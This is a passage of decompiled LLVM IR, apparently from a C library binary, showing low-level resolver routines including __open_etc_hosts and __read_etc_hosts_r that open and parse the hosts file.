  %v0_10014bcc = load i32, i32* @r30, align 4
  %v1_10014bcc = add i32 %v0_10014bcc, 2
  %v2_10014bcc = inttoptr i32 %v1_10014bcc to i8*
  %v3_10014bcc = load i8, i8* %v2_10014bcc, align 1
  %v4_10014bcc = zext i8 %v3_10014bcc to i32
  store i32 %v4_10014bcc, i32* %r0.global-to-local, align 4
  %v0_10014bd0 = load i32, i32* @r8, align 4
  %v1_10014bd0 = add i32 %v0_10014bd0, 1
  %v2_10014bd0 = inttoptr i32 %v1_10014bd0 to i8*
  %v3_10014bd0 = load i8, i8* %v2_10014bd0, align 1
  %v4_10014bd0 = zext i8 %v3_10014bd0 to i32
  store i32 %v4_10014bd0, i32* %r9.global-to-local, align 4
  %v1_10014bd4 = mul nuw nsw i32 %v4_10014bcc, 256
  %v2_10014bd8 = or i32 %v4_10014bd0, %v1_10014bd4
  store i32 %v2_10014bd8, i32* %r0.global-to-local, align 4
  %v1_10014bdc = load i32, i32* @r31, align 4
  %v2_10014bdc = add i32 %v1_10014bdc, 8
  %v3_10014bdc = inttoptr i32 %v2_10014bdc to i32*
  store i32 %v2_10014bd8, i32* %v3_10014bdc, align 4
  %v0_10014be0 = load i32, i32* @r8, align 4
  %v1_10014be0 = add i32 %v0_10014be0, 2
  %v2_10014be0 = inttoptr i32 %v1_10014be0 to i8*
  %v3_10014be0 = load i8, i8* %v2_10014be0, align 1
  %v4_10014be0 = zext i8 %v3_10014be0 to i32
  store i32 %v4_10014be0, i32* %r0.global-to-local, align 4
  %v0_10014be4 = load i32, i32* @r10, align 4
  %v1_10014be4 = add i32 %v0_10014be4, 1
  %v2_10014be4 = inttoptr i32 %v1_10014be4 to i8*
  %v3_10014be4 = load i8, i8* %v2_10014be4, align 1
  %v4_10014be4 = zext i8 %v3_10014be4 to i32
  store i32 %v4_10014be4, i32* %r11.global-to-local, align 4
  %v1_10014be8 = add i32 %v0_10014be4, 3
  %v2_10014be8 = inttoptr i32 %v1_10014be8 to i8*
  %v3_10014be8 = load i8, i8* %v2_10014be8, align 1
  %v4_10014be8 = zext i8 %v3_10014be8 to i32
  store i32 %v4_10014be8, i32* @r7, align 4
  %v1_10014bec = mul nuw i32 %v4_10014be0, 16777216
  store i32 %v1_10014bec, i32* %r0.global-to-local, align 4
  %v1_10014bf0 = add i32 %v0_10014be4, 2
  %v2_10014bf0 = inttoptr i32 %v1_10014bf0 to i8*
  %v3_10014bf0 = load i8, i8* %v2_10014bf0, align 1
  %v4_10014bf0 = zext i8 %v3_10014bf0 to i32
  %v1_10014bf4 = mul nuw nsw i32 %v4_10014be4, 65536
  %v2_10014bf8 = or i32 %v1_10014bf4, %v1_10014bec
  %v0_10014bfc = load i32, i32* @r28, align 4
  %v1_10014bfc = add i32 %v0_10014bfc, 10
  store i32 %v1_10014bfc, i32* %r11.global-to-local, align 4
  %v2_10014c00 = or i32 %v2_10014bf8, %v4_10014be8
  store i32 %v2_10014c00, i32* %r0.global-to-local, align 4
  %v1_10014c04 = mul nuw nsw i32 %v4_10014bf0, 256
  %v2_10014c08 = or i32 %v1_10014c04, %v2_10014c00
  store i32 %v2_10014c08, i32* %r9.global-to-local, align 4
  %v1_10014c0c = load i32, i32* @r31, align 4
  %v2_10014c0c = add i32 %v1_10014c0c, 12
  %v3_10014c0c = inttoptr i32 %v2_10014c0c to i32*
  store i32 %v2_10014c08, i32* %v3_10014c0c, align 4
  %v0_10014c10 = load i32, i32* @r8, align 4
  %v1_10014c10 = add i32 %v0_10014c10, 6
  %v2_10014c10 = inttoptr i32 %v1_10014c10 to i8*
  %v3_10014c10 = load i8, i8* %v2_10014c10, align 1
  %v4_10014c10 = zext i8 %v3_10014c10 to i32
  store i32 %v4_10014c10, i32* %r9.global-to-local, align 4
  %v0_10014c14 = load i32, i32* @r30, align 4
  %v1_10014c14 = add i32 %v0_10014c14, 9
  %v2_10014c14 = inttoptr i32 %v1_10014c14 to i8*
  %v3_10014c14 = load i8, i8* %v2_10014c14, align 1
  %v4_10014c14 = zext i8 %v3_10014c14 to i32
  store i32 %v4_10014c14, i32* %r0.global-to-local, align 4
  %v1_10014c18 = mul nuw nsw i32 %v4_10014c10, 256
  store i32 %v1_10014c18, i32* %r9.global-to-local, align 4
  %v0_10014c1c = load i32, i32* %r11.global-to-local, align 4
  %v1_10014c1c = load i32, i32* @r31, align 4
  %v2_10014c1c = add i32 %v1_10014c1c, 24
  %v3_10014c1c = inttoptr i32 %v2_10014c1c to i32*
  store i32 %v0_10014c1c, i32* %v3_10014c1c, align 4
  %v0_10014c20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014c20 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014c20 = or i32 %v1_10014c20, %v0_10014c20
  store i32 %v2_10014c20, i32* %r9.global-to-local, align 4
  %v0_10014c24 = load i32, i32* %r6.global-to-local, align 4
  %v1_10014c24 = load i32, i32* @r31, align 4
  %v2_10014c24 = add i32 %v1_10014c24, 20
  %v3_10014c24 = inttoptr i32 %v2_10014c24 to i32*
  store i32 %v0_10014c24, i32* %v3_10014c24, align 4
  %v0_10014c28 = load i32, i32* @r29, align 4
  %v1_10014c28 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014c28 = icmp slt i32 %v0_10014c28, %v1_10014c28
  %v1_10014c2c = add i32 %v1_10014c28, 10
  store i32 %v1_10014c2c, i32* %r0.global-to-local, align 4
  %v0_10014c30 = load i32, i32* @r27, align 4
  %v2_10014c30 = add i32 %v0_10014c30, %v1_10014c2c
  store i32 %v2_10014c30, i32* @r27, align 4
  %v1_10014c34 = load i32, i32* @r31, align 4
  %v2_10014c34 = add i32 %v1_10014c34, 16
  %v3_10014c34 = inttoptr i32 %v2_10014c34 to i32*
  store i32 %v1_10014c28, i32* %v3_10014c34, align 4
  br i1 %v2_10014c28, label %dec_label_pc_10014c3c, label %dec_label_pc_10014ba4.dec_label_pc_10014c40_crit_edge

dec_label_pc_10014ba4.dec_label_pc_10014c40_crit_edge: ; preds = %dec_label_pc_10014ba4
  %v0_10014c44.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10014c40

dec_label_pc_10014c3c:                            ; preds = %dec_label_pc_10014ba4
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10014c40

dec_label_pc_10014c40:                            ; preds = %dec_label_pc_10014ba4.dec_label_pc_10014c40_crit_edge, %entry, %dec_label_pc_10014b9c, %dec_label_pc_10014c3c
  %v0_10014c44 = phi i32 [ %v0_10014c44.pre, %dec_label_pc_10014ba4.dec_label_pc_10014c40_crit_edge ], [ %v2_10014b74, %entry ], [ %v1_10014b84, %dec_label_pc_10014b9c ], [ -1, %dec_label_pc_10014c3c ]
  store i32 %v0_10014b4c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014c44

; uselistorder directives
  uselistorder i32 %v1_10014c28, { 1, 0, 2 }
  uselistorder i32 %v1_10014bec, { 1, 0 }
  uselistorder i32 %v1_10014b84, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10014b74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10014b54, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 9, { 10, 11, 12, 13, 2, 8, 14, 3, 15, 4, 21, 0, 16, 17, 18, 19, 20, 5, 9, 22, 1, 6, 7 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10014c40, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_10014c5c = load i32, i32* @lr, align 4
  store i32 268520576, i32* @lr, align 4
  %v3_10014c7c = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_10017550.512 to i32), i32 ptrtoint (i32* @global_var_1001742c.451 to i32))
  %v3_10014c84 = icmp eq i32 %v3_10014c7c, 0
  br i1 %v3_10014c84, label %dec_label_pc_10014c8c, label %dec_label_pc_10014ca8

dec_label_pc_10014c8c:                            ; preds = %entry
  %v0_10014c80 = load i32, i32* @r29, align 4
  store i32 %v0_10014c5c, i32* @lr, align 4
  %v3_10014ca4 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001755c.513 to i32), i32 %v0_10014c80)
  br label %dec_label_pc_10014ca8

dec_label_pc_10014ca8:                            ; preds = %entry, %dec_label_pc_10014c8c
  %v0_10014cb8 = phi i32 [ %v3_10014c7c, %entry ], [ %v3_10014ca4, %dec_label_pc_10014c8c ]
  ret i32 %v0_10014cb8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 7, 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_10014ca8, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  store i32 %tmp, i32* @r7, align 4
  %v0_10014cbc = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_10014cd0 = sub i32 0, %arg6
  %v1_10014cd4 = urem i32 %v1_10014cd0, 4
  store i32 %v1_10014cd4, i32* %r0.global-to-local, align 4
  %v3_10014cd4 = icmp eq i32 %v1_10014cd4, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* @r19, align 4
  store i32 %arg4, i32* @r18, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10014cec = load i32, i32* @r10, align 4
  store i32 %v0_10014cec, i32* @r17, align 4
  store i32 %arg8, i32* @r16, align 4
  %v0_10014d08.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10014cd4, label %dec_label_pc_10014d08, label %dec_label_pc_10014cf8

dec_label_pc_10014cf8:                            ; preds = %entry
  %v2_10014cf8 = icmp ult i32 %v0_10014d08.pr, %v1_10014cd4
  br i1 %v2_10014cf8, label %dec_label_pc_10014fbc, label %dec_label_pc_10014d00

dec_label_pc_10014d00:                            ; preds = %dec_label_pc_10014cf8
  %v2_10014d00 = sub i32 %v0_10014d08.pr, %v1_10014cd4
  store i32 %v2_10014d00, i32* %r9.global-to-local, align 4
  %v2_10014d04 = add i32 %v1_10014cd4, %arg6
  store i32 %v2_10014d04, i32* @r30, align 4
  br label %dec_label_pc_10014d08

dec_label_pc_10014d08:                            ; preds = %entry, %dec_label_pc_10014d00
  %v0_10014d14 = phi i32 [ %v2_10014d04, %dec_label_pc_10014d00 ], [ %arg6, %entry ]
  %v0_10014d18 = phi i32 [ %v2_10014d00, %dec_label_pc_10014d00 ], [ %v0_10014d08.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_10014d18, 32
  br i1 %tmp49, label %dec_label_pc_10014fbc, label %dec_label_pc_10014d10

dec_label_pc_10014d10:                            ; preds = %dec_label_pc_10014d08
  %v3_10014d10 = icmp eq i32 %arg4, 1
  %v1_10014d14 = add i32 %v0_10014d14, 32
  store i32 %v1_10014d14, i32* @r24, align 4
  %v1_10014d18 = add i32 %v0_10014d18, -32
  store i32 %v1_10014d18, i32* @r27, align 4
  br i1 %v3_10014d10, label %dec_label_pc_10014e18, label %dec_label_pc_10014d20

dec_label_pc_10014d20:                            ; preds = %dec_label_pc_10014d10
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10014d28 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10014d28, align 4
  %tmp50 = icmp ult i32 %v1_10014d18, 4
  br i1 %tmp50, label %dec_label_pc_10014fbc, label %dec_label_pc_10014d30

dec_label_pc_10014d30:                            ; preds = %dec_label_pc_10014d20
  %v0_10014d30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014d30 = add i32 %v0_10014d30, -36
  store i32 %v1_10014d30, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10014d30, 8
  br i1 %tmp51, label %dec_label_pc_10014fbc, label %dec_label_pc_10014d3c

dec_label_pc_10014d3c:                            ; preds = %dec_label_pc_10014d30
  %v0_10014d3c = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10014d3c, 16
  br i1 %tmp52, label %dec_label_pc_10014fbc, label %dec_label_pc_10014d44

dec_label_pc_10014d44:                            ; preds = %dec_label_pc_10014d3c
  %v1_10014d44 = add i32 %v0_10014d30, -48
  store i32 %v1_10014d44, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10014d44, 8
  br i1 %tmp53, label %dec_label_pc_10014fbc, label %dec_label_pc_10014d50

dec_label_pc_10014d50:                            ; preds = %dec_label_pc_10014d44
  %v1_10014d50 = add i32 %v0_10014d30, -56
  store i32 %v1_10014d50, i32* %r0.global-to-local, align 4
  %v1_10014d54 = add i32 %v0_10014d30, -44
  store i32 %v1_10014d54, i32* @r27, align 4
  %v3_10014d58 = icmp ugt i32 %v1_10014d50, %v1_10014d54
  %v0_10014d5c = load i32, i32* @r30, align 4
  %v1_10014d5c = add i32 %v0_10014d5c, 36
  store i32 %v1_10014d5c, i32* @r29, align 4
  %v1_10014d60 = add i32 %v0_10014d5c, 48
  store i32 %v1_10014d60, i32* @r26, align 4
  br i1 %v3_10014d58, label %dec_label_pc_10014d74, label %dec_label_pc_10014d6c

dec_label_pc_10014d6c:                            ; preds = %dec_label_pc_10014d50
  store i32 %v1_10014d50, i32* @r27, align 4
  br label %dec_label_pc_10014d74

dec_label_pc_10014d74:                            ; preds = %dec_label_pc_10014d50, %dec_label_pc_10014d6c
  %v0_10014d74 = phi i32 [ %v1_10014d50, %dec_label_pc_10014d6c ], [ %v1_10014d54, %dec_label_pc_10014d50 ]
  %tmp54 = icmp ult i32 %v0_10014d74, 80
  br i1 %tmp54, label %dec_label_pc_10014fbc, label %dec_label_pc_10014d7c

dec_label_pc_10014d7c:                            ; preds = %dec_label_pc_10014d74
  store i32 268520832, i32* @lr, align 4
  %v0_10014d7c = call i32 @__open_etc_hosts()
  store i32 %v0_10014d7c, i32* @r20, align 4
  %v3_10014d80 = icmp eq i32 %v0_10014d7c, 0
  br i1 %v3_10014d80, label %dec_label_pc_10014da0, label %dec_label_pc_10014d88

dec_label_pc_10014d88:                            ; preds = %dec_label_pc_10014d7c
  %v0_10014d88 = load i32, i32* @r24, align 4
  store i32 %v0_10014d88, i32* @r25, align 4
  %v0_10014d8c = load i32, i32* @r29, align 4
  store i32 %v0_10014d8c, i32* @r22, align 4
  %v0_10014d90 = load i32, i32* @r26, align 4
  store i32 %v0_10014d90, i32* @r23, align 4
  %v0_10014d94 = load i32, i32* @r31, align 4
  store i32 %v0_10014d94, i32* @r24, align 4
  store i32 %v0_10014d88, i32* @r21, align 4
  %v1_10014e30.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_10014e28

dec_label_pc_10014da0:                            ; preds = %dec_label_pc_10014d7c
  %v1_10014da0 = load i32, i32* @r17, align 4
  %v2_10014da0 = inttoptr i32 %v1_10014da0 to i32*
  store i32 0, i32* %v2_10014da0, align 4
  %v0_10014da4 = call i32 @__errno_location()
  %v1_10014da8 = inttoptr i32 %v0_10014da4 to i32*
  %v2_10014da8 = load i32, i32* %v1_10014da8, align 4
  store i32 %v2_10014da8, i32* @r26, align 4
  br label %dec_label_pc_10014fc0

dec_label_pc_10014db0:                            ; preds = %dec_label_pc_10014f50
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014db4 = load i32, i32* @r25, align 4
  %v1_10014db4 = load i32, i32* @r22, align 4
  %v2_10014db4 = inttoptr i32 %v1_10014db4 to i32*
  store i32 %v0_10014db4, i32* %v2_10014db4, align 4
  %v0_10014db8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014db8 = load i32, i32* @r22, align 4
  %v2_10014db8 = add i32 %v1_10014db8, 4
  %v3_10014db8 = inttoptr i32 %v2_10014db8 to i32*
  store i32 %v0_10014db8, i32* %v3_10014db8, align 4
  %v0_10014dbc = load i32, i32* @r30, align 4
  %v1_10014dbc = add i32 %v0_10014dbc, 8
  store i32 %v1_10014dbc, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10014dc4 = add i32 %v0_10014dbc, 4
  %v2_10014dc4 = inttoptr i32 %v1_10014dc4 to i32*
  %v3_10014dc4 = load i32, i32* %v2_10014dc4, align 4
  store i32 %v3_10014dc4, i32* %r0.global-to-local, align 4
  %v0_10014dc8 = load i32, i32* @r19, align 4
  %v1_10014dc8 = load i32, i32* @r28, align 4
  %v2_10014dc8 = add i32 %v1_10014dc8, 8
  %v3_10014dc8 = inttoptr i32 %v2_10014dc8 to i32*
  store i32 %v0_10014dc8, i32* %v3_10014dc8, align 4
  %v0_10014dcc = load i32, i32* %r0.global-to-local, align 4
  %v1_10014dcc = load i32, i32* @r28, align 4
  %v2_10014dcc = inttoptr i32 %v1_10014dcc to i32*
  store i32 %v0_10014dcc, i32* %v2_10014dcc, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10014dd4 = load i32, i32* @r28, align 4
  %v2_10014dd4 = add i32 %v1_10014dd4, 12
  %v3_10014dd4 = inttoptr i32 %v2_10014dd4 to i32*
  store i32 4, i32* %v3_10014dd4, align 4
  %v0_10014dd8 = load i32, i32* @r22, align 4
  %v1_10014dd8 = load i32, i32* @r28, align 4
  %v2_10014dd8 = add i32 %v1_10014dd8, 16
  %v3_10014dd8 = inttoptr i32 %v2_10014dd8 to i32*
  store i32 %v0_10014dd8, i32* %v3_10014dd8, align 4
  br label %dec_label_pc_10014e0c

dec_label_pc_10014de0:                            ; preds = %dec_label_pc_10014f74
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014de4 = load i32, i32* @r21, align 4
  %v1_10014de4 = load i32, i32* @r23, align 4
  %v2_10014de4 = inttoptr i32 %v1_10014de4 to i32*
  store i32 %v0_10014de4, i32* %v2_10014de4, align 4
  %v0_10014de8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014de8 = load i32, i32* @r23, align 4
  %v2_10014de8 = add i32 %v1_10014de8, 4
  %v3_10014de8 = inttoptr i32 %v2_10014de8 to i32*
  store i32 %v0_10014de8, i32* %v3_10014de8, align 4
  %v0_10014dec = load i32, i32* @r30, align 4
  %v1_10014dec = add i32 %v0_10014dec, 8
  store i32 %v1_10014dec, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10014df4 = add i32 %v0_10014dec, 4
  %v2_10014df4 = inttoptr i32 %v1_10014df4 to i32*
  %v3_10014df4 = load i32, i32* %v2_10014df4, align 4
  store i32 %v3_10014df4, i32* %r0.global-to-local, align 4
  %v0_10014df8 = load i32, i32* @r19, align 4
  %v1_10014df8 = load i32, i32* @r28, align 4
  %v2_10014df8 = add i32 %v1_10014df8, 8
  %v3_10014df8 = inttoptr i32 %v2_10014df8 to i32*
  store i32 %v0_10014df8, i32* %v3_10014df8, align 4
  %v0_10014dfc = load i32, i32* %r0.global-to-local, align 4
  %v1_10014dfc = load i32, i32* @r28, align 4
  %v2_10014dfc = inttoptr i32 %v1_10014dfc to i32*
  store i32 %v0_10014dfc, i32* %v2_10014dfc, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_10014e04 = load i32, i32* @r28, align 4
  %v2_10014e04 = add i32 %v1_10014e04, 12
  %v3_10014e04 = inttoptr i32 %v2_10014e04 to i32*
  store i32 16, i32* %v3_10014e04, align 4
  %v0_10014e08 = load i32, i32* @r23, align 4
  %v1_10014e08 = load i32, i32* @r28, align 4
  %v2_10014e08 = add i32 %v1_10014e08, 16
  %v3_10014e08 = inttoptr i32 %v2_10014e08 to i32*
  store i32 %v0_10014e08, i32* %v3_10014e08, align 4
  br label %dec_label_pc_10014e0c

dec_label_pc_10014e0c:                            ; preds = %dec_label_pc_10014db0, %dec_label_pc_10014de0
  %v0_10014e0c = load i32, i32* %r9.global-to-local, align 4
  %v1_10014e0c = load i32, i32* @r28, align 4
  %v2_10014e0c = add i32 %v1_10014e0c, 4
  %v3_10014e0c = inttoptr i32 %v2_10014e0c to i32*
  store i32 %v0_10014e0c, i32* %v3_10014e0c, align 4
  %v0_10014e10 = load i32, i32* @r28, align 4
  %v1_10014e10 = load i32, i32* @r17, align 4
  %v2_10014e10 = inttoptr i32 %v1_10014e10 to i32*
  store i32 %v0_10014e10, i32* %v2_10014e10, align 4
  br label %dec_label_pc_10014fa8

dec_label_pc_10014e18:                            ; preds = %dec_label_pc_10014d10
  store i32 0, i32* @r25, align 4
  store i32 0, i32* @r22, align 4
  store i32 0, i32* @r21, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10014e28

dec_label_pc_10014e28:                            ; preds = %dec_label_pc_10014d88, %dec_label_pc_10014e18
  %v1_10014e30 = phi i32 [ %v1_10014e30.pre, %dec_label_pc_10014d88 ], [ %arg8, %dec_label_pc_10014e18 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10014e30 = inttoptr i32 %v1_10014e30 to i32*
  store i32 1, i32* %v2_10014e30, align 4
  br label %dec_label_pc_10014f90

dec_label_pc_10014e38:                            ; preds = %dec_label_pc_10014f90
  %v0_10014e38 = load i32, i32* @r24, align 4
  store i32 %v0_10014e38, i32* @r3, align 4
  store i32 268521028, i32* @lr, align 4
  %v2_10014e40 = call i32 @__GI_strchr(i32 %v0_10014e38, i32 35)
  %v4_10014e44 = icmp eq i32 %v2_10014e40, 0
  br i1 %v4_10014e44, label %dec_label_pc_10014e54, label %dec_label_pc_10014e4c

dec_label_pc_10014e4c:                            ; preds = %dec_label_pc_10014e38
  %v3_10014e40 = inttoptr i32 %v2_10014e40 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10014e40, align 1
  br label %dec_label_pc_10014e54

dec_label_pc_10014e54:                            ; preds = %dec_label_pc_10014e38, %dec_label_pc_10014e4c
  %v0_10014e54 = load i32, i32* @r24, align 4
  store i32 %v0_10014e54, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_10014ed017 = inttoptr i32 %v0_10014e54 to i8*
  %v2_10014ed018 = load i8, i8* %v1_10014ed017, align 1
  %v3_10014ed019 = zext i8 %v2_10014ed018 to i32
  store i32 %v3_10014ed019, i32* %r0.global-to-local, align 4
  %v3_10014ed421 = icmp eq i8 %v2_10014ed018, 0
  br i1 %v3_10014ed421, label %dec_label_pc_10014edc, label %dec_label_pc_10014e6c.preheader

dec_label_pc_10014e60:                            ; preds = %dec_label_pc_10014e7c
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10014e64 = inttoptr i32 %v0_10014ea0 to i8*
  store i8 0, i8* %v3_10014e64, align 1
  %v0_10014e68 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014e68 = add i32 %v0_10014e68, 1
  store i32 %v1_10014e68, i32* %r11.global-to-local, align 4
  %v1_10014e6c = inttoptr i32 %v1_10014e68 to i8*
  %v2_10014e6c = load i8, i8* %v1_10014e6c, align 1
  %v3_10014e6c = zext i8 %v2_10014e6c to i32
  store i32 %v3_10014e6c, i32* %r0.global-to-local, align 4
  %v3_10014e70 = icmp eq i8 %v2_10014e6c, 0
  %v1_10014e74 = mul nuw nsw i32 %v3_10014e6c, 2
  store i32 %v1_10014e74, i32* @r10, align 4
  br i1 %v3_10014e70, label %dec_label_pc_10014edc, label %dec_label_pc_10014e7c

dec_label_pc_10014e7c:                            ; preds = %dec_label_pc_10014e6c.preheader, %dec_label_pc_10014e60
  %v0_10014ea0 = phi i32 [ %v1_10014e68, %dec_label_pc_10014e60 ], [ %v0_10014e6c2, %dec_label_pc_10014e6c.preheader ]
  %v0_10014e84 = phi i32 [ %v1_10014e74, %dec_label_pc_10014e60 ], [ %v1_10014e748, %dec_label_pc_10014e6c.preheader ]
  %v3_10014e80 = load i32, i32* @global_var_1002c2d0, align 4
  store i32 %v3_10014e80, i32* %r9.global-to-local, align 4
  %v2_10014e84 = add i32 %v3_10014e80, %v0_10014e84
  %v3_10014e84 = inttoptr i32 %v2_10014e84 to i16*
  %v4_10014e84 = load i16, i16* %v3_10014e84, align 2
  %v5_10014e84 = zext i16 %v4_10014e84 to i32
  store i32 %v5_10014e84, i32* %r0.global-to-local, align 4
  %v1_10014e88 = and i32 %v5_10014e84, 32
  store i32 %v1_10014e88, i32* %r9.global-to-local, align 4
  %v3_10014e88 = icmp eq i32 %v1_10014e88, 0
  br i1 %v3_10014e88, label %dec_label_pc_10014e90, label %dec_label_pc_10014e60

dec_label_pc_10014e90:                            ; preds = %dec_label_pc_10014e7c
  %v0_10014e90 = load i32, i32* @r29, align 4
  %v2_10014e90 = icmp sgt i32 %v0_10014e90, 6
  br i1 %v2_10014e90, label %dec_label_pc_10014eac.preheader, label %dec_label_pc_10014e98

dec_label_pc_10014e98:                            ; preds = %dec_label_pc_10014e90
  %v1_10014e98 = mul i32 %v0_10014e90, 4
  store i32 %v1_10014e98, i32* %r0.global-to-local, align 4
  %v1_10014e9c = add i32 %v0_10014e90, 1
  store i32 %v1_10014e9c, i32* @r29, align 4
  %v1_10014ea0 = load i32, i32* @r30, align 4
  %v3_10014ea0 = add i32 %v1_10014ea0, %v1_10014e98
  %v4_10014ea0 = inttoptr i32 %v3_10014ea0 to i32*
  store i32 %v0_10014ea0, i32* %v4_10014ea0, align 4
  %v0_10014eac9.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014eac.preheader

dec_label_pc_10014eac.preheader:                  ; preds = %dec_label_pc_10014e98, %dec_label_pc_10014e90
  %v0_10014eac9 = phi i32 [ %v0_10014eac9.pre, %dec_label_pc_10014e98 ], [ %v0_10014ea0, %dec_label_pc_10014e90 ]
  %v1_10014eac10 = inttoptr i32 %v0_10014eac9 to i8*
  %v2_10014eac11 = load i8, i8* %v1_10014eac10, align 1
  %v3_10014eac12 = zext i8 %v2_10014eac11 to i32
  store i32 %v3_10014eac12, i32* %r0.global-to-local, align 4
  %v3_10014eb014 = icmp eq i8 %v2_10014eac11, 0
  %v1_10014eb415 = mul nuw nsw i32 %v3_10014eac12, 2
  store i32 %v1_10014eb415, i32* @r10, align 4
  br i1 %v3_10014eb014, label %dec_label_pc_10014ed0.loopexit, label %dec_label_pc_10014ebc.lr.ph

dec_label_pc_10014ebc.lr.ph:                      ; preds = %dec_label_pc_10014eac.preheader
  %v3_10014ec0.pre = load i32, i32* @global_var_1002c2d0, align 4
  br label %dec_label_pc_10014ebc

dec_label_pc_10014ea8:                            ; preds = %dec_label_pc_10014ebc
  %v1_10014ea8 = add i32 %v0_10014ea8, 1
  store i32 %v1_10014ea8, i32* %r11.global-to-local, align 4
  %v1_10014eac = inttoptr i32 %v1_10014ea8 to i8*
  %v2_10014eac = load i8, i8* %v1_10014eac, align 1
  %v3_10014eac = zext i8 %v2_10014eac to i32
  store i32 %v3_10014eac, i32* %r0.global-to-local, align 4
  %v3_10014eb0 = icmp eq i8 %v2_10014eac, 0
  %v1_10014eb4 = mul nuw nsw i32 %v3_10014eac, 2
  store i32 %v1_10014eb4, i32* @r10, align 4
  br i1 %v3_10014eb0, label %dec_label_pc_10014ed0.loopexit, label %dec_label_pc_10014ebc

dec_label_pc_10014ebc:                            ; preds = %dec_label_pc_10014ebc.lr.ph, %dec_label_pc_10014ea8
  %v0_10014ea8 = phi i32 [ %v0_10014eac9, %dec_label_pc_10014ebc.lr.ph ], [ %v1_10014ea8, %dec_label_pc_10014ea8 ]
  %v0_10014ec4 = phi i32 [ %v1_10014eb415, %dec_label_pc_10014ebc.lr.ph ], [ %v1_10014eb4, %dec_label_pc_10014ea8 ]
  store i32 %v3_10014ec0.pre, i32* %r9.global-to-local, align 4
  %v2_10014ec4 = add i32 %v0_10014ec4, %v3_10014ec0.pre
  %v3_10014ec4 = inttoptr i32 %v2_10014ec4 to i16*
  %v4_10014ec4 = load i16, i16* %v3_10014ec4, align 2
  %v5_10014ec4 = zext i16 %v4_10014ec4 to i32
  store i32 %v5_10014ec4, i32* %r0.global-to-local, align 4
  %v1_10014ec8 = and i32 %v5_10014ec4, 32
  store i32 %v1_10014ec8, i32* %r9.global-to-local, align 4
  %v3_10014ec8 = icmp eq i32 %v1_10014ec8, 0
  br i1 %v3_10014ec8, label %dec_label_pc_10014ea8, label %dec_label_pc_10014ed0.loopexit

dec_label_pc_10014ed0.loopexit:                   ; preds = %dec_label_pc_10014ebc, %dec_label_pc_10014ea8, %dec_label_pc_10014eac.preheader
  %v0_10014ed0 = phi i32 [ %v0_10014eac9, %dec_label_pc_10014eac.preheader ], [ %v0_10014ea8, %dec_label_pc_10014ebc ], [ %v1_10014ea8, %dec_label_pc_10014ea8 ]
  %v1_10014ed0 = inttoptr i32 %v0_10014ed0 to i8*
  %v2_10014ed0 = load i8, i8* %v1_10014ed0, align 1
  %v3_10014ed0 = zext i8 %v2_10014ed0 to i32
  store i32 %v3_10014ed0, i32* %r0.global-to-local, align 4
  %v3_10014ed4 = icmp eq i8 %v2_10014ed0, 0
  br i1 %v3_10014ed4, label %dec_label_pc_10014edc, label %dec_label_pc_10014e6c.preheader

dec_label_pc_10014e6c.preheader:                  ; preds = %dec_label_pc_10014e54, %dec_label_pc_10014ed0.loopexit
  %v0_10014e6c2 = phi i32 [ %v0_10014ed0, %dec_label_pc_10014ed0.loopexit ], [ %v0_10014e54, %dec_label_pc_10014e54 ]
